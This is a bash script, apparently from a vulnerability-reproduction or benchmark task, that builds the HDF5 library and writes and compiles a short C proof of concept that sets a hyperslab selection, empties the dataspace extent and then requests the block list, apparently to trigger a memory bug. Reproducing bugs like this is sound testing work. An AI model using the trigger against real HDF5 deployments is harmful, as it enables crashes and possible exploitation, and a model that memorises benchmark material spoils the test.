#!/bin/bash -eu

HDF5_REPO_PATH=$(pwd)

mkdir build

pushd build
cmake .. \
    -DCMAKE_BUILD_TYPE=Release \
    -DCMAKE_INSTALL_PREFIX=$HDF5_REPO_PATH/install \
    -DBUILD_SHARED_LIBS=ON \
    -DHDF5_BUILD_TOOLS=ON \
    -DHDF5_BUILD_EXAMPLES=OFF \
    -DHDF5_BUILD_TESTS=OFF

make -j16
make install
popd

cat <<EOF > poc.c
#include "hdf5.h"

static void
test_h5s_bug5(void)
{
    hsize_t dims[]  = {10};
    hsize_t start[] = {0};
    hsize_t count[] = {1};
    hsize_t blocks[1];
    herr_t  ret      = 0;
    hid_t   space_id = H5I_INVALID_HID;
    space_id = H5Screate_simple(1, dims, NULL);
    ret = H5Sselect_hyperslab(space_id, H5S_SELECT_SET, start, NULL, count, NULL);
    ret = H5Sset_extent_none(space_id);
    H5E_BEGIN_TRY
    {
        ret = H5Sget_select_hyper_blocklist(space_id, 0, 1, blocks);
    }
    H5E_END_TRY
    ret = H5Sclose(space_id);
}

int main(void) {
    test_h5s_bug5();
    return 0;
}
EOF

if [ ! -z "${CC:-}" ]; then
    $CC $CFLAGS -o poc poc.c -I$HDF5_REPO_PATH/install/include -L$HDF5_REPO_PATH/install/lib -lhdf5 -Wl,-rpath=$HDF5_REPO_PATH/install/lib
fi